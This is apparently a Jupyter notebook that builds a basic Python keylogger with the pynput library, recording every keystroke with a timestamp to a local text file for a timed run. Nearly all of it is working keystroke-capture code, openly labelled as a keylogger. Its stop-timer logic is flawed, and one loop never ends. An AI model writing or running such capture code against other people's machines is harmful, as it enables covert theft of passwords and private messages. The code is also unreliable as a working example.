{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "4b83b884",
   "metadata": {},
   "outputs": [],
   "source": [
    "import argparse as arg\n",
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "import time\n",
    "import datetime"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3cf0b8b6",
   "metadata": {},
   "source": [
    "### >Functions "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "bba056ae",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    logging.info(key)\n",
    "    \n",
    "def on_release(time, later):\n",
    "    if time>=later:\n",
    "        return False\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b2cb0381",
   "metadata": {},
   "source": [
    "###  > Main  ###"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2c942c5d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2022-06-15 15:02:40.463370\n"
     ]
    }
   ],
   "source": [
    "#setting the date rn\n",
    "now = datetime.datetime.now()\n",
    "print(now)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "1335ee86",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0:00:10\n"
     ]
    }
   ],
   "source": [
    "#Asking user to set the run time\n",
    "# runtime=int(input(\"How long should the keylogger run ?(minutes)\"))\n",
    "timedelta=datetime.timedelta(seconds=10)\n",
    "print(timedelta)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "343aa53c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The keylogger will run until : 2022-06-15 15:02:50.463370\n"
     ]
    }
   ],
   "source": [
    "#calculating until when the keylogger will run\n",
    "later = now + timedelta\n",
    "print(\"The keylogger will run until :\",later)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4f05c6f0",
   "metadata": {},
   "outputs": [],
   "source": [
    "#setting file name and config\n",
    "file = \"ArgKeys.txt\"\n",
    "logging.basicConfig(filename=file, level=logging.DEBUG, format=\"%(asctime)s | %(message)s\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ae8b888c",
   "metadata": {},
   "outputs": [],
   "source": [
    "with Listener(on_press=on_press, on_release=on_release(now,later)) as listener:\n",
    "      listener.join()\n",
    "      while True :\n",
    "        time.sleep(5)\n",
    "        now = datetime.datetime.now()\n",
    "        print(now)\n",
    "\n",
    "#if now>=later:\n",
    "print(\"made it\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8ea8da6",
   "metadata": {},
   "outputs": [],
   "source": [
    "while now<= later:\n",
    "    with Listener(on_press=on_press) as listener:\n",
    "        listener.join()\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
